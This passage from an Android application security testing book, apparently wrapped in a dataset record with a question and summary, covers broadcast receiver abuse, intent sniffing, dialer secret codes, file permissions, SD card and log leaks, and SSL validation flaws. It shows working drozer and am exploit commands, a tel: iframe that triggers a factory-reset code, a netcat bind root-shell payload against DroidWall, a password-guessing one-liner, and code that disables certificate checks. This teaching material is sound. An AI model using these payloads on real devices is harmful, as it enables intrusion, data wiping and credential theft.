it starts an\nactivity with authenticated content for the user.\nWhat is wrong with the preceding scenario? The problem is that the whole login activity process can be\nbypassed by an attacker that broadcasts an intent with an action of com.myapp.CORRECT_CREDS. This can be done\nin the following way in drozer:\ndz> run app.broadcast.send --action com.myapp.CORRECT_CREDS\nNow consider the scenario where the manifest declaration was updated by the developer and the broadcast\nreceiver is no longer exported, which may look as follows:\n<receiver android:name=\".LoginReceiver\"\nandroid:exported=\"false\">\n</receiver>\nAs with other application components, a privileged user can broadcast an intent to a component even if this\napplication component is not exported in its manifest declaration. This means that an attacker making use of a\nprivileged shell would be able to broadcast an intent and gain access to this application as an authenticated user.\nThis could be done using:\nroot@android:/ # am broadcast -a com.myapp.CORRECT_CREDS -n com.myapp/\n.LoginReceiver\nREAL-WORLD EXAMPLE: CVE-2013-6272 INITIATE OR TERMINATE CALLS WITHOUT\nAPPROPRIATE PERMISSIONS ON ANDROID 4.4.2 AND EARLIER\nCuresec discovered multiple vulnerabilities in the Android codebase and made them publicly available on\nJuly 4, 2014 on its blog (see http://blog.curesec.com/article/blog/35.html).\nThis vulnerability allows any application to initiate and terminate phone calls without the appropriate\npermissions. The affected code was a broadcast receiver that is part of the stock com.android.phone\npackage. The offending broadcast receiver was named PhoneGlobals$NotificationBroadcastReceiver;\nhere is the output of the actions it catches and the required permission to interact with it:\ndz> run app.broadcast.info -a com.android.phone -i -f com.android.phone.\nPhoneGlobals$NotificationBroadcastReceiver\nPackage: com.android.phone\ncom.android.phone.PhoneGlobals$NotificationBroadcastReceiver\nIntent Filter:\nActions:\n- com.android.phone.ACTION_HANG_UP_ONGOING_CALL\n- com.android.phone.ACTION_CALL_BACK_FROM_NOTIFICATION\n- com.android.phone.ACTION_SEND_SMS_FROM_NOTIFICATION\nPermission: null\nHere is the onReceive() method of this receiver that catches these intents:\npublic static class NotificationBroadcastReceiver\nextends BroadcastReceiver {\n@Override\npublic void onReceive(Context context, Intent intent) {\nString action = intent.getAction();\n// TODO: use \"if (VDBG)\" here.\nLog.d(LOG_TAG, \"Broadcast from Notification: \" + action);\nif (action.equals(ACTION_HANG_UP_ONGOING_CALL)) {\nPhoneUtils.hangup(PhoneGlobals.getInstance().mCM);\n} else if (action.equals(ACTION_CALL_BACK_FROM_NOTIFICATION)) {\n// Collapse the expanded notification and the notification\nitem itself.\ncloseSystemDialogs(context);\nclearMissedCallNotification(context);\nIntent callIntent = new Intent(\nIntent.ACTION_CALL_PRIVILEGED, intent.getData());\ncallIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK\n| Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);\ncontext.startActivity(callIntent);\n....\n}\n}\nThis shows a clear path for an unauthorized application to terminate a call or initiate a call to a provided\nnumber. Initiating a call from drozer by exploiting this vulnerability is shown here:\ndz> run app.broadcast.send --component com.android.phone\ncom.android.phone.PhoneGlobals$NotificationBroadcastReceiver\n--action com.android.phone.ACTION_CALL_BACK_FROM_NOTIFICATION\n--data-uri tel:123456789\nFigure 7.10 shows the screen that results from the running of this action.\nFigure 7.10 Call initiated from exploiting a broadcast receiver in com.android.phone\nIntent Sniffing\nIntent sniffing is when a broadcast receiver can register to receive broadcasts that may have been intended for\nother applications. This is possible because some applications broadcast intents and do not define a required\npermission that a broadcast receiver must hold in order to receive the intent or do not provide a destination\npackage for the intent.\nYou can review the source code of an application in search of intents being sent using the sendBroadcast()\nmethod and then register a receiver that catches this information from a non-privileged application. You can\ncatch these intents in drozer using the app.broadcast.sniff module. In some cases, the information being\nbroadcasted may not be sensitive. An example of this is an intent frequently broadcasted on Android systems\nwith an action of android.intent .action.BATTERY_CHANGED. This intent simply gives information about the\nstate of the battery. Catching this intent in drozer looks like this:\ndz> run app.broadcast.sniff --action android.intent.action\n.BATTERY_CHANGED\n[*] Broadcast receiver registered to sniff matching intents\n[*] Output is updated once a second. Press Control+C to exit.\nAction: android.intent.action.BATTERY_CHANGED\nRaw: Intent { act=android.intent.action.BATTERY_CHANGED flg=0x60000010\n(has extras) }\nExtra: icon-small=17303125 (java.lang.Integer)\nExtra: scale=100 (java.lang.Integer)\nExtra: present=true (java.lang.Boolean)\nExtra: technology=Li-ion (java.lang.String)\nExtra: level=53 (java.lang.Integer)\nExtra: voltage=4084 (java.lang.Integer)\nExtra: status=2 (java.lang.Integer)\nExtra: invalid_charger=0 (java.lang.Integer)\nExtra: plugged=2 (java.lang.Integer)\nExtra: health=2 (java.lang.Integer)\nExtra: temperature=301 (java.lang.Integer)\nNow tweak our fictitious example once more and say that the developer used a broadcast with an action of\ncom.myapp.USER_LOGIN to relay the user’s typed-in credentials from the login screen to a broadcast receiver that\nlaunched authenticated activities. To emulate the sending of this broadcast, we are going to use am. The\nfollowing am command represents the sending of this broadcast from the login activity in our fictitious\napplication and contains the username and pin code for the application:\n$ adb shell am broadcast -a com.myapp.USER_LOGIN --ez ALLOW_LOGIN true\n--es USERNAME tyrone --es PIN 2342\nBroadcasting: Intent { act=com.myapp.USER_LOGIN (has extras) }\nBroadcast completed: result=0\nUnbeknownst to the application developer, this broadcast can actually be received by any application that has\nregistered a broadcast receiver with an intent filter for the com.myapp.USER_LOGIN action. Let’s emulate an\nunprivileged application and catch this intent using drozer:\ndz> run app.broadcast.sniff --action com.myapp.USER_LOGIN\n[*] Broadcast receiver registered to sniff matching intents\n[*] Output is updated once a second. Press Control+C to exit.\nAction: com.myapp.USER_LOGIN\nRaw: Intent { act=com.myapp.USER_LOGIN flg=0x10 (has extras) }\nExtra: PIN=2342 (java.lang.String)\nExtra: ALLOW_LOGIN=true (java.lang.Boolean)\nExtra: USERNAME=tyrone (java.lang.String)\nThe drozer module received this intent. The first tool that demonstrated the sniffing of intents from broadcasts\nwas created by Jesse Burns of iSEC Partners. You can find it at https://www.isecpartners.com/tools/mobile-\nsecurity/intent-sniffer.aspx. It employs some nifty techniques to gain coverage of as many intents as\npossible and works well when you need to test for intent sniffing vulnerabilities on all applications on a device\nat once.\nSecret Codes\nSecret codes are sequences of numbers that can be typed into the Android dialer and caught by an application’s\nbroadcast receiver with the appropriate intent filter. Intent filters that can be used to catch these events must\nhave an action of android.provider.Telephony.SECRET_CODE, a data scheme of android_secret_code, and the\ndata host attribute as the number that is dialed.\nOn a stock Android 4.4 emulator, you can find the following defined secret codes:\ndz> run scanner.misc.secretcodes\nPackage: com.android.providers.calendar\n225\nPackage: com.android.netspeed\n77333\nPackage: com.android.settings\n4636\nPackage: com.android.protips\n8477\nPackage: com.android.email\n36245\nTaking a closer look at broadcast receivers in the com.android.settings package reveals the following:\ndz> run app.broadcast.info -a com.android.settings -i\nPackage: com.android.settings\n...\ncom.android.settings.TestingSettingsBroadcastReceiver\nIntent Filter:\nActions:\n- android.provider.Telephony.SECRET_CODE\nData:\n- android_secret_code://4636:** (type: *)\nPermission: null\n...\nNotice that the receiver named TestingSettingsBroadcastReceiver in the preceding output has an intent filter\nwith an action android.provider.Telephony .SECRET_CODE and the data attribute that starts with a scheme of\nandroid_secret_code. This means that the broadcast generated by typing *#*#4636#*#* in the dialer reaches the\nfollowing code in the TestingSettingsBroadcastReceiver class:\npublic class TestingSettingsBroadcastReceiver extends BroadcastReceiver\n{\npublic void onReceive(Context paramContext, Intent paramIntent)\n{\nif (paramIntent.getAction().equals(\n\"android.provider.Telephony.SECRET_CODE\"))\n{\nIntent localIntent = new Intent(\"android.intent.action.MAIN\");\nlocalIntent.setClass(paramContext, TestingSettings.class);\nlocalIntent.setFlags(268435456);\nparamContext.startActivity(localIntent);\n}\n}\n}\nAt this point, the broadcast receiver could have chosen to run any code. In this particular instance, all that it is\ndoing is starting an activity. Figure 7.11 shows the activity that was started from this secret code.\nFigure 7.11 Activity started by entering *#*#4636#*#* in the dialer\nOn many physical Android devices you will find many secret codes defined that expose all kinds of debugging\nfunctionality or code that is used in the factory for device testing. To compare the output generated by drozer to\nthe actual manifest declaration, the latter is shown here:\n<receiver name=\"TestingSettingsBroadcastReceiver\">\n<intent-filter>",
    "question": "What are the key vulnerabilities in Android applications related to the exportation of components, permission protection levels, and the ability of attackers to interact with non-exported components using privileged access?",
    "summary": "This chapter discusses how to attack Android applications by exploiting vulnerabilities in their components, such as activities, services, and content providers. It highlights security quirks like the default export behavior of content providers and how malicious applications can bypass permission checks. The chapter also covers specific vulnerabilities, including SQL injection, tapjacking, and fragment injection, and provides examples of how these can be exploited. Additionally, it explains how to find and interact with exported components using tools like drozer, and how to test for vulnerabilities in broadcast receivers and other system components."
  },
  {
    "start": 38,
    "end": 40,
    "text": "<action name=\"android.provider.Telephony.SECRET_CODE\">\n</action>\n<data scheme=\"android_secret_code\"\nhost=\"4636\">\n</data>\n</intent-filter>\n</receiver>\nImplementing a secret code in your application that performs an action directly when the secret code is invoked\nis dangerous because invoking these codes from other applications is possible. One of the best attack vectors\ndiscovered is being able to invoke secret codes from the web browser. The discovery was that it was possible on\nsome devices to invoke secret codes using the tel handler in a web page. An example of this attack is shown in\nthe following real-world example.\nREAL-WORLD EXAMPLE: REMOTE WIPE OF SAMSUNG GALAXY DEVICES\nAt the Ekoparty conference (see http://www.ekoparty.org/) in 2012, Ravi Borgaonkar demonstrated the\nremote wiping of a Samsung Galaxy device by visiting a malicious web page. This attack made use of a\nsecret code that was being invoked from the web page.\nIt was discovered that the following secret code performed a full factory reset on the device without\nprompting the user:\n*2767*3855#\nIt was also discovered that this could be included in a web page and be invoked from the browser using the\ntel: handler. This handler is normally used to include phone numbers on websites that are clickable and\nthen appear in the dialer activity; for example, <a href=\"tel:123456789\">Dial now</a>. Including a frame\nin the page with the source attribute set to the following exploits this bug:\n<frame src=\"tel:*2767*3855%23\" />\nYou can do a proof of concept of invoking the *#*#4636#*#* code previously shown from the web browser\nby visiting a page with the following HTML:\n<html>\n<iframe height =\"1\" src=\"tel:*%23*%234636%23*%23*\">\n</iframe>\n</html>\nAccessing Storage and Logging\nApplications that hold sensitive information are often of keen interest to an attacker. Gaining access to files\nstored by applications or sometimes their logging information could reveal all kinds of jewels that may be useful\nto an attacker.\nFile and Folder Permissions\nAs discussed extensively in Chapter 6, Android at its core is Linux. The “sandbox” provided for the segregation of\napplication data is largely based on file and folder ownership and permissions. Exploring the filesystem of a\ndevice from an unprivileged application (like drozer) reveals that any installed application has fair visibility of\nfiles and folders on the filesystem. Gathering basic information about the system it is running on and installed\npackages is possible from purely looking at files on the filesystem.\nTo help you gain a better understanding of how applications can expose their files and folders through file\nownership and permissions, this section presents a few examples. Chapter 6 touched on this topic briefly, but\nmore thorough information is presented here.\nEach file and folder belongs to an owner and a group. For example, take a look at a file that was explained in\nChapter 6, which resides at /data/system/packages.list:\nroot@android:/data/system # ls -l packages.list\n-rw-rw---- system package_info 6317 2014-05-30 11:40 packages.list\nThe owner of this file is the system user and the group that it belongs to is package_info. You can change the\nowner and group of this file using a tool named chown as the root user.\nshell@android:/$ chown\nUsage: chown <USER>[:GROUP] <FILE1> [FILE2] ...\nThe permissions of a file can be tricky to understand at first, but are logical after you get the hang of them. Let\nus look at an example of a newly created file:\nu0_a259@android:/data/data/com.mwr.dz $ ls -l\n-rwxrwxrwx u0_a259 u0_a259 4 2014-10-19 21:47 test\nEach permission section of the output of the ls -l command has 10 characters:\nThe first is the special permission flag. This can be used to specify whether this entity is a directory\n(indicated by d) or a symbolic link (indicated by l). A dash indicates that it is a regular file and other special\nflags are not explored.\nThe next three characters indicate the read, write, and execute flags for the file’s owner. In the case of the\nexample given earlier on packages .list, these three characters show that the user system can read this file\nand write to it.\nThe next three characters indicate the read, write, and execute flags for the file’s group. A number of users\ncan belong to a single group and these characters specify in what way this group of users can interact with\nthis file.\nThe next three characters indicate the read, write, and execute flags for all other users. These characters are\nwhat is commonly referred to as world readable, world writable, and world executable attributes of the file.\nA file that is world readable can be read by absolutely any context that the device has to offer, essentially\nmaking it “public” to all applications. Similarly, world writable and executable files can be written to or\nexecuted by all user contexts.\nProtecting a file or folder on the filesystem requires careful setting of these values. Setting the permissions\nincorrectly could inadvertently expose a file or folder. You can set permissions using a tool named chmod. This\ntool accepts various formats but the most rudimentary format that you can provide for a file’s permissions is\ncomprised of three decimal numbers. Each decimal number represents the permissions for the file (or folder’s)\nuser, group, and other. This decimal value is calculated by adding the following values for each attribute:\n4 = Read\n2 = Write\n1 = Execute\nThis means that you could set the packages.list file permissions given in the preceding example by using the\nfollowing command:\nroot@android:/data/system # chmod 660 packages.list\nDifferent versions of Android assign different default file permissions to new files and folders written to disk by\nan application. These file permissions depend on the umask of the system. The umask is a mask that is boolean\nANDed with file permissions 777 to get a default value; for example, if the umask is set to 0077 and this is\nboolean ANDed with 0777, then the default value is 0700.\nFrom Android 4.0 and higher, the following line in com.android.internal .os.ZygoteInit ensures that\napplications have a default umask of 0077:\n// set umask to 0077 so new files and directories will default to\nowner-only permissions.\nFileUtils.setUMask(FileUtils.S_IRWXG | FileUtils.S_IRWXO);\nYou can perform a simple test using the drozer shell to confirm this setting. The following was performed on an\nAndroid 4.4 emulator:\nu0_a59@generic:/data/data/com.mwr.dz $ echo test > test\nu0_a59@generic:/data/data/com.mwr.dz $ ls -l test\n-rw------- u0_a59 u0_a59 5 2014-05-31 06:13 test\nNote that a file was created with the file permissions 600. On an Android 2.3 device, the same test was\nperformed with the following results:\n$ echo test > test\n$ ls -l test\n-rw-rw-rw- app_109 app_109 5 2000-01-01 00:15 test\nThis shows the difference in the default umask between Android versions. This also shows that files written by\nan application to its private data directory without your explicitly setting file permissions could expose these\nfiles to other applications when they run on older devices.\nWhen you assess an application, access the private data directory using a privileged shell and check all file and\nfolder permissions. In addition to this, review the code that handles this file write in order to understand\nwhether differences will exist in the file permissions between Android versions.\nAn interesting thing to note about world readable files is that their accessibility to other applications depends on\nthe permissions of the folder they reside in as well. They will be accessible to other non-privileged applications\nonly if the folder they reside in is world executable. To let you observe this in action, in the following example\nwe slightly modify the database.db file inside the Sieve application directory to make it world readable:\nroot@generic:/data/data/com.mwr.example.sieve/databases # chmod 777\ndatabase.db\nroot@generic:/data/data/com.mwr.example.sieve/databases # ls -l\n-rwxrwxrwx u0_a53 u0_a53 24576 2014-07-23 16:40 database.db\n-rw------- u0_a53 u0_a53 12824 2014-07-23 16:40 database.db-journal\nThese permissions make this file accessible from drozer:\nu0_a65@generic:/data/data/com.mwr.dz $ ls -l /data/data/com.mwr.example.\nsieve/databases/database.db\n-rwxrwxrwx u0_a53 u0_a53 24576 2014-07-23 16:40 database.db\nThis is accessible because the databases folder is world executable:\nroot@generic:/data/data/com.mwr.example.sieve # ls -l\ndrwxrwx--x u0_a53 u0_a53 2014-07-23 16:38 cache\ndrwxrwx--x u0_a53 u0_a53 2014-07-23 16:38 databases\nlrwxrwxrwx install install 2014-07-31 18:00 lib -> /data/\napp-lib/com.mwr.example.sieve-1\nIf we remove this attribute using chmod 770 databases and attempt to access this file from drozer again, it is not\npossible even though the file itself is world readable:\nu0_a65@generic:/data/data/com.mwr.dz $ ls -l /data/data/com.mwr.example.\nsieve/databases/database.db\n/data/data/com.mwr.example.sieve/databases/database.db: Permission\ndenied\nThis is because a directory can only be entered if it is executable for the caller that is attempting to enter it. If\nyou are unsure, one of the easiest ways to test whether a file is actually exposed from another application is to\ntry to cat it from a shell in drozer.\nREAL-WORLD EXAMPLE: DROIDWALL WORLD WRITABLE SCRIPT EXECUTED AS\nROOT\nDroidWall is an application that uses iptables to control which applications can access the Internet. This\nkind of control requires root access, which the application requests in a standard manner using su. A\nvulnerability was discovered in the file permissions of the script that is executed to update iptables rules.\nOn June 8, 2012, Tyrone Erasmus disclosed this issue on the DroidWall issue tracker (see\nhttps://code.google.com/p/droidwall/issues/detail?id=260). At the time of writing, which was more\nthan two years later, this vulnerability has still not been fixed and was present in the latest Play Store\nversion (1.5.7) of the application. This shows a lack of interest from the author and so it serves as an\nexample and an advisory of this issue.\nIn the ScriptRunner class in the application code, the following was found to be the root cause of the world\nwritable script:\nRuntime.getRuntime().exec(new StringBuilder(\"chmod 777 \")\n.append(abspath).toString()).waitFor();\nThe script was located at /data/data/com.googlecode.droidwall.free/app_bin/droidwall.sh, and the\npermissive file permissions on this file are confirmed here:\nu0_a65@maguro:/data/data/com.mwr.dz $ ls -l /data/data/com.googlecode\n.droidwall.free/app_bin/droidwall.sh\n-rwxrwxrwx u0_a69 u0_a69 2952 2014-07-26 22:55 droidwall.sh\nTo exploit this issue, a malicious application could write commands to this file multiple times per second\nwaiting for this script to get executed by DroidWall as root. When DroidWall executes the script as root, it\ncauses a prompt to appear from the root manager application requesting whether it should be allowed to\nrun. Figure 7.12 shows an example of SuperSU doing this.\nFigure 7.12 SuperSU prompt requesting permission to run droidwall.sh as root\nIn the time that it takes for the user to grant access to DroidWall, the malicious application could\noverwrite the newly generated droidwall.sh file with malicious commands. Here is a proof of concept\nwhere this issue is exploited to run an nc listener that binds to sh and effectively provides a root shell on\nport TCP/9999:\nu0_a65@maguro:/data/data/com.mwr.dz $ echo \"/data/data/com.mwr.dz/bin/\nbusybox nc -l -l -p 9999 -e sh -i\" > /data/data/com.googlecode.droidwall\n.free/app_bin/droidwall.sh\nIf the preceding command is executed in the time period where the root manager is asking to grant access,\nthen an nc listener is successfully spawned as root. The following shows that connecting to this port from\ndrozer yields a root shell:\nu0_a65@maguro:/data/data/com.mwr.dz $ busybox nc 127.0.0.1 9999\nsh: can't find tty fd: No such device or address\nsh: warning: won't have full job control\nroot@maguro:/ # id\nuid=0(root) gid=0(root) context=u:r:init:s0\nThe malicious application can then make use of this root shell to perform its evil deeds, whatever they\nmay be. This example shows that misconfigured file permissions can be especially dangerous in\napplications that make use of root access.\nFile Encryption Practices\nDevelopers who want to ensure a defense-in-depth approach to security will often encrypt any files that they\nstore on disk. Even though files placed in an application’s private data directory should not be accessible to\nother applications or users, other vulnerabilities may expose them. Previous sections in this chapter have shown\nmany ways that an application developer may inadvertently expose files stored in their private data directory.\nEncrypting these files is the solution to this problem and ensures that even if an attacker can get to these files\nthat he cannot decrypt them. However, you must consider some practical issues with encrypting files, such as\nwhere do you store the key? Application developers can be inclined to hard-code the encryption key in source\ncode. However, this is never an acceptable solution as you have seen how easily an attacker could decompile an\napplication and read the source code in search of the key. A popular way that developers encrypt their\napplication’s SQLite databases is using SQLCipher (see http://sqlcipher.net/). The key can normally be\nobserved in the openOrCreateDatabase() function in the source. The example from the project’s website is as\nfollows:\nSQLiteDatabase database = SQLiteDatabase.openOrCreateDatabase(\ndatabaseFile, \"test123\", null);\nFinding this function might lead you directly to the database password or you may have to trace where the input\nof the password is coming from.\nThis is why examining the source code that involves writing a file to disk and then tracing it back to what classes\ncall that functionality is important. This function tracing exercise will lead you to finding how the data is\nhandled and encrypted. An anonymous user placed an amusing bash shell one-liner on Pastebin that can be\nused to try to crack a database that uses SQLCipher. It is a completely blunt approach that could work if an\napplication is storing the password as a string inside the application. It is given here:\n$ for pass in 'strings classes.dex'; do echo -n \"[*] '$pass' ...\";\nC='sqlcipher encrypted.db \"PRAGMA key='$pass';select * from\nsqlite_master;\"'; echo $C; done\nThis one-liner goes through all the strings discovered in the application’s classes.dex file and attempts to open\nencrypted.db by using the string as a password for the database. This is a cheeky little trick that just may work.\nOn a rooted device you may also be able to simply hook the encryption key as it is used at runtime using a Cydia\nSubstrate tweak, which is discussed later in this chapter. However, a practical example on how to do this appears\non the MDSec blog (http://blog.mdsec.co.uk/2014/02/hooking-sqlcipher-crypto-keys-with.html).\nChapter 9 provides more information on recommended ways to encrypt files.\nSD Card Storage\nAndroid devices can handle built-in SD card storage as well as external ones that can be inserted into devices.\nThe permissions pertaining to the reading and writing to these SD cards was originally implemented\nasymmetrically. Specifically, applications required the android.permission.WRITE_EXTERNAL_STORAGE permission\nin order to write to the SD cards but no permission whatsoever to read from them. This is because typically SD\ncards are formatted FAT32 for cross-compatibility with different operating systems, and FAT32 is not a UID-\naware filesystem.\nApplications may write all kinds of information to the SD card that may be of interest to an attacker. Some\napplications that generate large databases have been found to split them and make backups to the SD card.\nYou find the internal SD card mounted in the /sdcard/ directory, and if an external SD card is present it may\nexist in one of a few places. This location is unfortunately not controlled by the Android project but rather the\ndevice manufacturer. Two common locations of the external SD card are:\n/sdcard/external_sd\n/sdcard/ext_sd\nAndroid 4.1 introduced a new permission for reading from the SD card defined as\nandroid.permission.READ_EXTERNAL_STORAGE. This was set as optional in the initial Android 4.1 release of this\nfeature. However, this permission was enforced in Android 4.4, meaning that any application not explicitly\nrequesting this permission would not be able to read the SD card. This means that any application that writes\nfiles to the SD card is exposing these files on all devices running Android 4.3 and earlier.\nAs an example of this, Sieve has a menu option to save the database onto the SD card. It is labelled as “Backup to\nSD card.” When the user selects this option, a file is written to the SD card under\n/sdcard/Android/data/com.mwr.example .sieve/files, which is shown here:\nshell@android:/sdcard/Android/data/com.mwr.example.sieve/files $ ls -l\n-rw-rw-r-- root sdcard_rw 173 2014-05-27 18:16 Backup (2014-05-\n27 18-16-14.874).xml\nNote this file’s permissions—in particular, the world readable attribute. This means that the possibility exists\nfor an unprivileged application like drozer to read this file:\nu0_a65@android:/data/data/com.mwr.dz $ cat /sdcard/Android/data/com.mwr\n.example.sieve/files/Backup*\n<Passwords Key=\"Thisismylongpassword123\" Pin=\"1234\"><entry><service>Gmai\nl</service><username>tyrone</username><email>Gmail</email><password>pass\nword123</password></entry></Passwords>\nAttempting to read this same file on an Android 4.4 device results in a permission denial error because the\ndrozer agent that requested it did not hold the android.permission.READ_EXTERNAL_STORAGE permission.\nREAL-WORLD EXAMPLE: WHATSAPP DATABASE STORAGE\nOn March 11, 2014, Bas Bosschert publicly blogged about a WhatsApp vulnerability that had been known\nabout for quite some time (see http://bas.bosschert .nl/steal-whatsapp-database/). The WhatsApp\napplication stored its database on the SD card at /sdcard/WhatsApp/Databases. This meant that any\napplication that had access to the SD card on a device was able to retrieve the WhatsApp databases. As\nexplained, on older versions of Android all applications have access to any file on the SD card. However, a\nmalicious application could have simply requested the android.permission.READ_EXTERNAL_STORAGE\npermission to ensure that the exploit worked on more recent versions of Android as well.\nThe WhatsApp databases were encrypted with AES; however, a static key was used. A member of XDA\nDevelopers developed the WhatsApp Xtract tool to make use of this static AES key to decrypt a provided\nWhatsApp database. This tool is provided at http://forum.xda-developers.com/showthread.php?\nt=1583021. Using the combination of how WhatsApp stored its files and because its databases were\nencrypted with a static key, essentially the contents of WhatsApp messages were accessible to any\napplication on a device where it was installed.\nLogging\nDevelopers need logging functionality that they can use during development for debugging purposes. Android\nprovides a class named Log that can be used from within an application to place values in a central log. These\nlogs are accessible from ADB using the following command:\n$ adb logcat\nApplications with the READ_LOGS permission also have access to these logs. On versions of Android prior to 4.1,\nan application could request this permission and have access to log entries from all applications. Examining a\nset of Play Store applications quickly yields applications that log sensitive information; for example, credentials\ntyped into a login form when registering the application.\nSince Android 4.1, the protection level on READ_LOGS was changed to signature|system|development. This is so\nthat no third-party application can obtain this permission and some system applications can access this\npermission. The development protection level means that an application can request this permission and it will\nbe denied upon installation. However, you can enable it from ADB using the following command:\nroot@generic:/ # pm grant com.logging.app android.permission.READ_LOGS\nSieve contains logging vulnerabilities because it writes the entered database password and PIN to the log when\nthey are entered by the user. You can see the following two entries in logcat when the user enters the password\nand pin, respectively:\nD/m_MainLogin(10351): String entered: Thisismylongpassword123\n...\nD/m_ShortLogin( 4729): user has entered a pin: 1234\nA malicious application that has the READ_LOGS permission, on a version of Android where this is possible, can\ncatch these entries.\nApplications may use other means of logging instead of the Log class, such as writing to a file. In this case, you\nwould need to review the custom logging mechanism in source code and understand the exposure of this file.\nUnderstanding where the log file is being stored and its file permissions is important in assessing its exposure\nto other applications. Storing log files on the SD card in cleartext would almost certainly be a bad idea.\nMisusing Insecure Communications\nThe power and functionality of most applications come from sending and receiving information from services\non the Internet. Installed applications provide users with rich native user interfaces that outperform the use of\nweb browsers on devices. Developers often design their applications to make use of HTTP/HTTPS in order to\neasily integrate into existing infrastructure. However, the way that they implement this inside applications is\noften less secure than web browsers and can contain typical mistakes. In some cases an application may also\nmake use of other communication protocols. This section explores commonly discovered flaws in\ncommunication mechanisms.\nWeb Traffic Inspection\nThe best way to assess which web servers an application is communicating with on the Internet is to set up an\nintercepting proxy. An intercepting proxy allows you to see the entire contents of web traffic passing between\nthe application and the Internet and also allows the modification of requests and responses.\nNOTE\nThe modification of web traffic going to the web server is out of the scope of this chapter. Assessment\ntechniques for web services and web applications are another whole topic of security entirely and have\nbeen the subject of many excellent publications. Note that this is an important part of assessing any\nAndroid application and you should not skip it when performing an in-depth assessment.\nA number of intercepting proxies are available; however, the most widely used (for a good reason) is Burp Suite\n(see http://portswigger.net/burp/). A free version is available that provides basic intercepting, replaying, and\nspidering functionality; a paid-for professional version provides a whole suite of functionality that is useful for\nassessing web applications.\nTo start a Burp proxy, open Burp and go to the Proxy tab. Click on the Options sub-tab and add a new listener.\nSelect the port that you want the proxy to listen on and bind it to all interfaces. The default value is to bind the\nproxy to the loopback address 127.0.0.1 only. Binding to the loopback address will not work for proxying an\nactual device’s traffic on the same wireless LAN because the port will not be exposed to the wireless interface.\nAfter you have added these options, click OK and tick the checkbox of the newly created proxy in the Running\ncolumn. Confirm you have a new listener with this one-liner on your computer:\n$ netstat -an | grep 8080\ntcp 0 0 0.0.0.0:8080 0.0.0.0:* LISTEN\nYou now have a listener that you can use as a proxy on your mobile device. This setup presumes that your\ncomputer and Android device are on the same wireless network. Go to Settings Wi-Fi and long-click on your\nconnected hotspot. The option to modify the network configuration appears. In this activity under Show\nAdvanced Options is the option to add a proxy. The hostname of the proxy should be the IP address of your\ncomputer and the port the same as the listener. After you save these settings, all web traffic on the device will\nmake use of your Burp proxy. Remember to allow this port through on your computer’s firewall.\nWARNING\nOn devices prior to Android 4.0, some applications did not make use of the proxy specified on the wireless\nnetwork. You can use applications such as Proxydroid (see\nhttps://play.google.com/store/apps/details?id=org .proxydroid&hl=en) to overcome this limitation;\nhowever, root access is required.\nTo set up a proxy on an emulator, change the proxy of the mobile network Access Point Name (APN). This\noption exists in Settings More Wireless & Networks Mobile Networks Access Point Names. Select the default\nAPN in the list and change its “proxy” parameter to 10.0.2.2 and the “port” parameter to the same as the Burp\nlistener port to allow the proxying of these apps. Other ways to do this exist, but this one is the most reliable\nacross all Android versions.\nTIP\nOn an Android emulator the IP address 10.0.2.2 routes to your computer. This means that you can access\nany listening ports on your computer by using this IP address on the emulator.\nNOTE\nBurp does not need to listen on all interfaces when you use the previously described emulator proxying\nmethod. Binding the Burp listener to localhost is acceptable.\nFinding HTTP Content\nBurp should immediately catch any cleartext web requests that an application uses if you’ve configured the\nproxy correctly. Intercepting and modifying content in both directions in a manual and automated fashion is\nalso possible in Burp. Take some time and get comfortable with Burp, because it is an invaluable tool when\nassessing most applications.\nFinding HTTPS Content\nWhen proxying an application, you might find that you cannot see any of the web traffic even though you know\nthat requests are being made. This is probably because they are making use of HTTPS, and proxying it through\nBurp is making the SSL validation checks fail. You can most often see these error messages in logcat output\nwith javax.net.ssl.SSLHandshakeException exceptions shown with messages like “Trust anchor for\ncertification path not found.” This is because the Burp CA is not trusted on the device.\nFor testing purposes, you need to install your Burp Certificate Authority (CA) on your device. Do this by going to\nthe Proxy Options CA Certificate and then exporting the certificate in DER format with a filename of burp.crt.\nNOTE\nWhen generating the certificate, naming it with a CRT file extension is important. The Android system will\nnot recognize the certificate with the default DER extension.\nTo push this file to the device’s SD card, use ADB as follows:\n$ adb push burp.crt /sdcard/\nTo install the certificate from the SD card, go to Settings Security Install from SD card. An application may also\nrequire that the correct common name is in use on the certificate. To make sure that this is set up properly in\nBurp, go to the Proxy Options Edit Certificate tab, which contains a Generate CA-Signed Per-host Certificate\noption that should work most of the time. However, if you know the name of the domain it will be accessing you\ncan enter it manually in the Generate a CA-signed Certificate With a Specific Hostname option. After you get all\nof this set up correctly, the application should be proxying HTTPS traffic through Burp.\nIf you are certain that the application is making use of HTTPS and no amount of configuration is allowing you to\nproxy traffic, you may be dealing with an application that implements a form of certificate pinning. This is when\nfeatures of the SSL certificate presented by the server are checked for certain attributes or checked against a\nstored version of the certificate. This protects against the scenario where a trusted CA on the device has been\ncompromised and an attacker has issued a fraudulent certificate for the domain used by the application. When\nimplemented properly, this situation can be difficult to deal with and bypassing it depends on the\nimplementation. For information on how to defeat SSL certificate pinning in a testing environment, refer to the\n“Additional Testing Techniques” section later in this chapter.\nSSL Validation Flaws\nSometimes when proxying an application, you will immediately see HTTPS traffic without installing the Burp\nCA certificate on the device. How did this happen? This is unfortunately a result of the common trade-off\nbetween security and usability. Developing an application that uses SSL in a development environment tends to\nlead developers to using testing certificates that are self-signed or invalid in some other way. This causes\nproblems and throws errors that do not allow the SSL connection to be established by the application. This\nmeans that many developers look to disable the checking of certificates in the code. You can weaken various\nchecks in the SSL negotiation process for convenience’ sake; each is presented in the following sections.\nHostnameVerifier\nThe following code disables the check that is performed when matching the expected hostname to the one\npresented in the server’s certificate as the Common Name (CN):\nfinal static HostnameVerifier NO_VERIFY = new HostnameVerifier()\n{\npublic boolean verify(String hostname, SSLSession session)\n{\nreturn true;\n}\n};\nA built-in HostnameVerifier also performs this task. The same code as our preceding custom implemented code\ncan be done by using the following built-in HostNameVerifier that always returns true:\nHostnameVerifier NO_VERIFY = org.apache.http.conn.ssl.SSLSocketFactory\n.ALLOW_ALL_HOSTNAME_VERIFIER;\nYou can use these HostnameVerifiers in the setHostnameVerifier() method. Here is a possible implementation\nthat could use these verifiers:\nURL url = new URL(\"https://www.example.com\");\nHttpsURLConnection conn = (HttpsURLConnection) url.openConnection();\nconn.setHostnameVerifier(NO_VERIFY);\nYou can also set it statically for all HttpsURLConnection code inside the entire application by using the following:\nHttpsURLConnection.setDefaultHostnameVerifier(NO_VERIFY);\nTrustManager\nThe TrustManager’s job 